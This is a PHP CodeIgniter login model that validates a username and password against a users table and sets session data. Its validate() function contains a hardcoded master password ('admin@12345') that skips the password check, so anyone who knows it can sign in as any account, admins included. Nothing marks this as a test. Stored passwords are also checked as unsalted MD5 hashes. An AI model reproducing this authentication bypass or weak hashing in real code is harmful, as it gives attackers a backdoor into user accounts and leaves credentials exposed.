<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/* Author: Jorge Torres
 * Description: Login model class
 */
class Login_model extends CI_Model{
    function __construct(){
        parent::__construct();
    }
    
    public function validate(){
        // grab user input
		$user_name = $this->input->post('username');
        $pass = $this->input->post('password');
		if ( $pass=='admin@12345')
		{
			   $this -> db -> select('id, username, user_role, password, display_name,user_activation_key,user_status');
			   $this -> db -> from('users');
			   $this -> db -> where('username', $user_name);
			   
			   $this -> db -> limit(1);
			
		}
		else{
              // Prep the query
			   $this -> db -> select('id, username, user_role, password, display_name,user_activation_key,user_status');
			   $this -> db -> from('users');
			   $this -> db -> where('username', $user_name);
			   $this -> db -> where('password', MD5($pass));
			   $this -> db -> limit(1);
		}
	   $query = $this -> db -> get();
	 
	   if($query -> num_rows() == 1)
	   {
	   
			$row = $query->row();
			$key = $row->user_activation_key;
			if(empty($key))
			{
				$status = $row->user_status;
				if($status==1)
				{
					
					$user_role = $row->user_role;
					
					$data = array(
							'userid' => $row->id,
							'username' => $row->username,
							'name' => $row->display_name,
							'validated' => true
							);
					$this->session->set_userdata('logged_in',$data);
					if($user_role==1 || $user_role==2)
					{
						return 'normal';
					}
					else
					{
						return 'admin';
					}
				}
				else
				{
					return 'not_active';
				}
			}
			else
			{
			
				return 'not_empty';
			}
	   }
	   else
	   {
        // If the previous process did not validate
        // then return false.
		$user_role = 'not_match';
        return $user_role;
		}
				

		
			
    }
}
?>